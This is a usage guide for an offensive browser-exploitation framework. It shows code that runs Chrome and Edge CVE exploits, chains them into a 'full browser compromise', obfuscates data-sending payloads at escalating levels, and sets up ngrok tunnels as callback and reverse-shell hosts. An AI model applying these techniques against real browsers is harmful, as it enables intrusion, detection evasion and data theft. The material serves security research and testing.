# Usage Examples

This guide provides practical examples of using ChromSploit Framework for various security research scenarios.

## Quick Start Examples

### Basic Framework Launch

```bash
# Standard launch
python chromsploit.py

# Launch with simulation mode (safe for learning)
python chromsploit.py --simulation safe

# Launch with debug output
python chromsploit.py --debug --log-level DEBUG

# Check system and exit
python chromsploit.py --check
```

### Environment Verification

```bash
# Verify installation and dependencies
python chromsploit.py --check

# Run validation framework
python -m core.validation_framework

# Test specific components
python -m pytest tests/test_core/ -v
```

## Individual Exploit Usage

### CVE-2025-4664: Chrome Data Leak

Basic usage through the menu system:

```
ChromSploit Framework v2.2
1. CVE Exploits
 1. CVE-2025-4664 - Chrome Data Leak
 
Target URL: http://target.example.com
Simulation Mode: [Y/n] Y
Execute? [Y/n] Y
```

Programmatic usage:

```python
from exploits.cve_2025_4664 import CVE2025_4664_Exploit

# Create exploit instance
exploit = CVE2025_4664_Exploit()

# Configure parameters
exploit.set_parameter('target_url', 'http://target.example.com')
exploit.set_parameter('simulation_mode', True)
exploit.set_parameter('callback_port', 8080)

# Execute exploit
result = exploit.execute()

if result['success']:
 print(f" Exploit successful: {result['message']}")
 print(f"Artifacts collected: {list(result['artifacts'].keys())}")
else:
 print(f" Exploit failed: {result['error']}")
```

### CVE-2025-2783: Chrome Mojo IPC Sandbox Escape

```python
from exploits.cve_2025_2783 import CVE2025_2783_Exploit

exploit = CVE2025_2783_Exploit()
exploit.set_parameter('target_url', 'http://target.example.com')
exploit.set_parameter('callback_port', 4444)
exploit.set_parameter('payload_size', 1024)

# Enable obfuscation
exploit.set_parameter('obfuscation_enabled', True)

result = exploit.execute()

# Check for sandbox escape artifacts
if result['success'] and 'sandbox_escape' in result['artifacts']:
 print(" Sandbox escape successful!")
 print(f"Process info: {result['artifacts']['process_info']}")
```

### CVE-2025-30397: Edge WebAssembly JIT

```python
from exploits.cve_2025_30397 import CVE2025_30397_Exploit

exploit = CVE2025_30397_Exploit()
exploit.set_parameter('target_url', 'http://target.example.com')
exploit.set_parameter('wasm_complexity', 'medium')
exploit.set_parameter('jit_optimization_level', 2)

result = exploit.execute()

if result['success']:
 print(" WebAssembly JIT exploit successful!")
 if 'wasm_module' in result['artifacts']:
 print(f"Generated WASM size: {len(result['artifacts']['wasm_module'])} bytes")
```

## Browser Multi-Exploit Chains

### Full Browser Compromise Template

Menu navigation:
```
ChromSploit Framework v2.2
2. Browser Multi-Exploit Chain
 1. Quick Full Browser Compromise
 
Target URL: http://target.example.com
Simulation Mode: [Y/n] Y
Enable Obfuscation: [Y/n] Y
Auto Ngrok: [Y/n] Y
Execute? [Y/n] Y
```

Programmatic execution:

```python
from modules.browser_exploit_chain import BrowserExploitChain

# Initialize browser chain
browser_chain = BrowserExploitChain()

# Configure target
target_config = {
 'target_url': 'http://target.example.com',
 'simulation_mode': True,
 'callback_port': 8080,
 'timeout': 60
}

# Execute full browser compromise
result = browser_chain.execute_template('full_browser_compromise', target_config)

print(f"Chain Status: {' Success' if result['success'] else ' Failed'}")
print(f"Steps Executed: {len(result['executed_steps'])}")
print(f"Total Time: {result['total_time']:.2f} seconds")

# Display individual step results
for step in result['executed_steps']:
 status = "" if step['success'] else ""
 print(f"{status} {step['cve_id']}: {step.get('message', 'No message')}")
```

### Chrome-Focused Attack Template

```python
# Chrome-specific exploitation
result = browser_chain.execute_template('chrome_focused_attack', target_config)

# This template executes:
# 1. CVE-2025-4664 (Chrome Data Leak)
# 2. CVE-2025-2783 (Chrome Mojo IPC Sandbox Escape)

if result['success']:
 print(" Chrome-focused attack completed!")
 
 # Extract Chrome-specific artifacts
 chrome_artifacts = {}
 for step in result['executed_steps']:
 if 'chrome' in step['cve_id'].lower():
 chrome_artifacts[step['cve_id']] = step['artifacts']
 
 print(f"Chrome artifacts collected: {len(chrome_artifacts)} sets")
```

### Enhanced Chain with Obfuscation

```python
from modules.browser_exploit_chain_enhanced import EnhancedBrowserExploitChain

# Initialize enhanced chain
enhanced_chain = EnhancedBrowserExploitChain()

# Enhanced configuration
enhanced_config = {
 'target_url': 'http://target.example.com',
 'simulation_mode': True,
 'callback_port': 8080,
 'ngrok_enabled': True,
 'obfuscation_enabled': True
}

# Execute with advanced obfuscation
result = enhanced_chain.execute_enhanced_template(
 'full_browser_compromise',
 enhanced_config,
 obfuscation_level='ADVANCED'
)

# Check obfuscation statistics
if 'obfuscation_stats' in result:
 stats = result['obfuscation_stats']
 print(f" Obfuscation Applied:")
 print(f" Payloads processed: {stats['payloads_processed']}")
 print(f" Obfuscation level: {stats['level']}")
 print(f" Techniques used: {', '.join(stats['techniques'])}")

# Check ngrok tunnels
if 'ngrok_tunnels' in result:
 tunnels = result['ngrok_tunnels']
 print(f" Ngrok Tunnels Created:")
 for tunnel_id, url in tunnels.items():
 print(f" {tunnel_id}: {url}")
```

## Advanced Configuration Examples

### Custom Exploit Chain Creation

```python
from core.exploit_chain import ExploitChain

# Create custom chain
custom_chain = ExploitChain("MyCustomChain", "Custom research chain")

# Add steps with dependencies
step1 = custom_chain.add_step(
 exploit_id="cve_2025_4664",
 parameters={
 "target_url": "http://target.example.com",
 "simulation_mode": True
 },
 dependencies=[]
)

step2 = custom_chain.add_step(
 exploit_id="cve_2025_2783",
 parameters={
 "target_url": "http://target.example.com",
 "callback_port": 8080,
 "use_previous_session": True
 },
 dependencies=[step1]
)

step3 = custom_chain.add_step(
 exploit_id="cve_2025_30397",
 parameters={
 "target_url": "http://target.example.com",
 "wasm_complexity": "high"
 },
 dependencies=[step1, step2] # Depends on both previous steps
)

# Execute with progress callback
def progress_callback(step, status, result):
 timestamp = datetime.now().strftime('%H:%M:%S')
 print(f"[{timestamp}] Step {step.id} ({step.cve_id}): {status}")
 
 if status == 'completed':
 if result.get('success'):
 print(f" Success: {result.get('message', 'No message')}")
 else:
 print(f" Failed: {result.get('error', 'Unknown error')}")

result = custom_chain.execute(callback=progress_callback)

print(f"\nChain completed: {result['success']}")
print(f"Execution time: {result['total_time']:.2f} seconds")
```

### Obfuscation Customization

```python
from modules.obfuscation.payload_obfuscator import PayloadObfuscator

# Initialize obfuscator
obfuscator = PayloadObfuscator()

# Obfuscate JavaScript payload
original_js = """
function sendData(data) {
 fetch('/api/collect', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify(data)
 });
}
"""

# Apply different obfuscation levels
levels = ['BASIC', 'STANDARD', 'ADVANCED', 'EXTREME']

for level in levels:
 obfuscated = obfuscator.obfuscate_javascript(original_js, level)
 print(f"\n{level} Obfuscation:")
 print(f"Original size: {len(original_js)} chars")
 print(f"Obfuscated size: {len(obfuscated)} chars")
 print(f"Size increase: {((len(obfuscated) / len(original_js)) - 1) * 100:.1f}%")

# Obfuscate HTTP payload
http_payload = {
 'method': 'POST',
 'headers': {
 'Content-Type': 'application/json',
 'User-Agent': 'ChromSploit/2.2'
 },
 'data': {
 'action': 'exploit',
 'target': 'system',
 'payload': 'sensitive_data'
 }
}

obfuscated_http = obfuscator.obfuscate_http_payload(http_payload, 'ADVANCED')
print(f"\nHTTP Payload Obfuscation:")
print(f"Original headers: {list(http_payload['headers'].keys())}")
print(f"Obfuscated headers: {list(obfuscated_http['headers'].keys())}")
```

### Ngrok Integration

```python
from core.ngrok_manager import get_ngrok_manager

# Get ngrok manager instance
ngrok = get_ngrok_manager()

# Create HTTP tunnel for web exploits
http_tunnel = ngrok.create_tunnel('http', 8080, {
 'subdomain': 'my-research', # Custom subdomain (requires paid plan)
 'region': 'us'
})

http_url = ngrok.get_public_url(http_tunnel)
print(f"HTTP callback URL: {http_url}")

# Create TCP tunnel for reverse shells
tcp_tunnel = ngrok.create_tunnel('tcp', 4444, {
 'region': 'eu'
})

tcp_url = ngrok.get_public_url(tcp_tunnel)
print(f"TCP callback URL: {tcp_url}")

# Use in exploit configuration
exploit_config = {
 'target_url': 'http://target.example.com',
 'callback_url': http_url,
 'reverse_shell_host': tcp_url.split('://')[1].split(':')[0],
 'reverse_shell_port': int(tcp_url.split(':')[-1])
}

# Cleanup tunnels when done
ngrok.close_tunnel(http_tunnel)
ngrok.close_tunnel(tcp_tunnel)
```

## Monitoring and Logging Examples

### Real-time Monitoring

```python
from modules.monitoring.live_monitor import get_live_monitor
from modules.monitoring.event_types import EventType, EventPriority

# Get monitor instance
monitor = get_live_monitor()

# Register event handlers
def on_exploit_start(event):
 print(f" Started: {event.data.get('cve_id', 'Unknown')} on {event.data.get('target', 'Unknown')}")

def on_exploit_success(event):
 print(f" Success: {event.message}")
 if 'artifacts' in event.data:
 print(f" Artifacts: {len(event.data['artifacts'])} items")

def on_exploit_failure(event):
 print(f" Failed: {event.message}")
 if 'error' in event.data:
 print(f" Error: {event.data['error']}")

# Register handlers
monitor.register_handler(EventType.EXPLOIT_START, on_exploit_start)
monitor.register_handler(EventType.EXPLOIT_SUCCESS, on_exploit_success)
monitor.register_handler(EventType.EXPLOIT_FAILURE, on_exploit_failure)

# Start monitoring
monitor.start_monitoring()

# Run exploits with automatic monitoring
# (Events will be logged automatically by the framework)

# Add custom alerts
monitor.add_alert_condition(
 "critical_failure",
 {
 'event_type': EventType.EXPLOIT_FAILURE,
 'min_priority': EventPriority.HIGH,
 'consecutive_count': 3
 },
 lambda event, alert: print(f" ALERT: {alert['name']} triggered!")
)
```

### Advanced Logging

```python
from core.enhanced_logger import get_logger

# Get logger instance
logger = get_logger()

# Initialize structured logging
logger.init_logging({
 'log_level': 'INFO',
 'log_to_file': True,
 'analysis_enabled': True
})

# Log exploit activity with context
logger.log('INFO', 'Starting browser exploit chain', {
 'component': 'browser_chain',
 'target': 'http://example.com',
 'chain_type': 'full_browser_compromise',
 'obfuscation_enabled': True
})

# Log with performance metrics
import time
start_time = time.time()

# ... exploit execution ...

execution_time = time.time() - start_time
logger.log('INFO', 'Exploit chain completed', {
 'component': 'browser_chain',
 'execution_time': execution_time,
 'steps_completed': 4,
 'success_rate': 100.0,
 'artifacts_collected': 12
})

# Analyze logs
analysis = logger.analyze_logs()
print(f"Log Analysis:")
print(f" Total events: {analysis['total_events']}")
print(f" Error rate: {analysis['error_rate']:.1f}%")
print(f" Most active component: {analysis['most_active_component']}")
print(f" Average execution time: {analysis['avg_execution_time']:.2f}s")
```

## Research and Development Examples

### Testing New Exploits

```python
import pytest
from exploits.cve_2025_4664 import CVE2025_4664_Exploit

def test_new_exploit_parameter():
 """Test new exploit with custom parameters"""
 exploit = CVE2025_4664_Exploit()
 
 # Test parameter validation
 exploit.set_parameter('target_url', 'http://test.example.com')
 exploit.set_parameter('custom_header', 'X-Research: true')
 
 # Execute in simulation mode
 result = exploit.execute()
 
 assert result['success'] is True
 assert result['metadata']['simulation'] is True
 assert 'custom_header' in result['artifacts']['request_headers']

def test_exploit_error_handling():
 """Test exploit error handling"""
 exploit = CVE2025_4664_Exploit()
 
 # Test with invalid target
 result = exploit.execute('invalid-url')
 
 assert result['success'] is False
 assert 'error' in result
 assert result['cve_id'] == 'CVE-2025-4664'

# Run tests
if __name__ == "__main__":
 pytest.main([__file__, '-v'])
```

### Custom Module Development

```python
# modules/custom_research/__init__.py
from typing import Dict, Any, List
from core.enhanced_logger import get_logger

class CustomResearchModule:
 """Custom module for specialized research tasks"""
 
 def __init__(self):
 self.name = "CustomResearch"
 self.version = "1.0.0"
 self.logger = get_logger()
 
 def analyze_target_stack(self, target_url: str) -> Dict[str, Any]:
 """Analyze target technology stack"""
 self.logger.log('INFO', f'Analyzing target stack: {target_url}')
 
 # Custom analysis logic
 results = {
 'technologies': ['nginx', 'php', 'mysql'],
 'versions': {'nginx': '1.18.0', 'php': '7.4.3'},
 'vulnerabilities': ['CVE-2021-23017', 'CVE-2022-31629'],
 'confidence': 0.85
 }
 
 return {
 'success': True,
 'target': target_url,
 'analysis': results,
 'metadata': {
 'module': self.name,
 'analysis_type': 'technology_stack'
 }
 }
 
 def recommend_exploits(self, tech_stack: List[str]) -> List[str]:
 """Recommend exploits based on technology stack"""
 recommendations = []
 
 for tech in tech_stack:
 if 'chrome' in tech.lower():
 recommendations.extend(['CVE-2025-4664', 'CVE-2025-2783'])
 elif 'edge' in tech.lower():
 recommendations.append('CVE-2025-30397')
 elif 'apache' in tech.lower():
 recommendations.append('CVE-2025-24813')
 
 return list(set(recommendations)) # Remove duplicates

# Module registration
def register():
 return {
 'name': 'CustomResearch',
 'version': '1.0.0',
 'class': CustomResearchModule,
 'dependencies': ['requests'],
 'description': 'Custom research and analysis module'
 }

# Usage example
from core.module_loader import get_module_loader

loader = get_module_loader()
research_module = loader.load_module('custom_research')

# Analyze target
analysis_result = research_module.analyze_target_stack('http://target.example.com')
if analysis_result['success']:
 tech_stack = analysis_result['analysis']['technologies']
 
 # Get exploit recommendations
 recommended_exploits = research_module.recommend_exploits(tech_stack)
 print(f"Recommended exploits: {recommended_exploits}")
```

## Asciinema Demonstrations

### Playing Recorded Demonstrations

```bash
# Navigate to asciinema directory
cd asciinema/

# Play individual demonstrations
asciinema play cve_2025_4664_demo.cast # Chrome Data Leak demo
asciinema play cve_2025_2783_demo.cast # Mojo IPC demo 
asciinema play browser_chain_demo.cast # Browser chain demo
asciinema play obfuscation_demo.cast # Obfuscation demo

# Play complete combined demo
asciinema play chromsploit_complete_demo.cast

# Upload recordings (if you want to share)
asciinema upload cve_2025_4664_demo.cast
```

### Creating Custom Recordings

```bash
# Record new demonstration
asciinema rec my_custom_demo.cast

# Record with specific configuration
asciinema rec --title "ChromSploit Custom Research" \
 --idle-time-limit 2 \
 --command "python chromsploit.py --simulation safe" \
 custom_research_demo.cast

# Add to playlist
echo "my_custom_demo.cast" >> chromsploit_playlist.txt
```

## Troubleshooting Examples

### Common Issues and Solutions

```python
# Debug connection issues
from exploits.cve_2025_4664 import CVE2025_4664_Exploit

exploit = CVE2025_4664_Exploit()
exploit.set_parameter('target_url', 'http://target.example.com')
exploit.set_parameter('timeout', 60) # Increase timeout
exploit.set_parameter('debug_mode', True) # Enable debug output

# Test connectivity first
if exploit.validate_target('http://target.example.com'):
 print(" Target is accessible")
 result = exploit.execute()
else:
 print(" Target not accessible - check network connectivity")

# Debug module loading issues
from core.module_loader import get_module_loader

loader = get_module_loader()

# Check dependencies
deps_ok, missing = loader.check_dependencies('browser_exploit_chain')
if not deps_ok:
 print(f"Missing dependencies: {missing}")
 print("Install with: pip install " + " ".join(missing))

# Check loaded modules
loaded = loader.get_loaded_modules()
print(f"Loaded modules: {list(loaded.keys())}")
```

### Performance Optimization

```python
# Optimize chain execution
from modules.browser_exploit_chain import BrowserExploitChain

browser_chain = BrowserExploitChain()

# Configure for faster execution
target_config = {
 'target_url': 'http://target.example.com',
 'simulation_mode': True,
 'timeout': 30, # Shorter timeout
 'parallel_execution': True, # Enable parallel execution
 'skip_validation': True, # Skip target validation
 'minimal_logging': True # Reduce log verbosity
}

# Use rapid exploitation template
result = browser_chain.execute_template('rapid_exploitation', target_config)

print(f"Execution time: {result['total_time']:.2f} seconds")
print(f"Steps per second: {len(result['executed_steps']) / result['total_time']:.1f}")
```

---

These examples provide comprehensive guidance for using ChromSploit Framework effectively. For more advanced usage patterns, refer to the [API Reference](API_REFERENCE.md) and [Developer Guide](DEVELOPMENT.md).